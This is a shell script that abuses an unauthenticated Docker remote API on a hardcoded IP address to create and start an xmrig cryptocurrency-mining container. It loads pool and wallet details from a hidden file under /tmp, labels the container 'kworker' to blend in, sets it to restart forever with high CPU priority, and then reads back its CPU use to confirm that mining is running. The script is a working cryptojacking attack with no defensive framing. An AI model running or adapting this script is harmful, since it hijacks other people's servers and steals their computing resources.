#!/bin/sh
# Does a real host actually produce? Create the real payload on the one host this
# session positively identified as real docker, wait, then read its cpu use back.
ip=${1:-134.209.121.89}
b="http://$ip:2375"
. /tmp/.sysd/worker.env 2>/dev/null
BODY="{\"Image\":\"xmrig/xmrig\",\"Cmd\":[\"-o\",\"$POOL\",\"-u\",\"$WALLET\",\"-p\",\"yieldtest\",\"--no-color\",\"-k\",\"--tls\",\"--cpu-max-threads-hint=100\"],\"Labels\":{\"kworker\":\"y\"},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":2048}}"
ncpu=$(curl -sS -m 5 "$b/info" | grep -o '"NCPU":[0-9]*' | cut -d: -f2)
mem=$(curl -sS -m 5 "$b/info" | grep -o '"MemTotal":[0-9]*' | cut -d: -f2)
echo "host $ip ncpu=$ncpu memMB=$(( ${mem:-0} / 1048576 ))"
cr=$(curl -sS -m 30 -X POST "$b/containers/create?name=yieldtest" -H 'Content-Type: application/json' -d "$BODY" 2>/dev/null)
id=$(printf '%s' "$cr" | grep -oE '"Id":"[0-9a-f]{20,80}"' | head -1 | cut -d'"' -f4)
echo "create id=$id"
[ -n "$id" ] || { echo "no id"; exit 0; }
curl -sS -m 25 -X POST "$b/containers/$id/start" >/dev/null 2>&1
echo "start issued, waiting 50s"
sleep 50
echo "--- top ---"
curl -sS -m 8 "$b/containers/$id/top" 2>/dev/null | head -c 480; echo
echo "--- stats ---"
s=$(curl -sS -m 8 "$b/containers/$id/stats?stream=false" 2>/dev/null)
printf '%s' "$s" | grep -o '"total_usage":[0-9]*' | head -2
printf '%s' "$s" | grep -o '"online_cpus":[0-9]*' | head -1
printf '%s' "$s" | grep -o '"system_cpu_usage":[0-9]*' | head -2
echo "--- state ---"
curl -sS -m 8 "$b/containers/$id/json" 2>/dev/null | grep -o '"Status":"[^"]*"' | head -1
curl -sS -m 8 "$b/containers/$id/json" 2>/dev/null | grep -o '"RestartCount":[0-9]*' | head -1
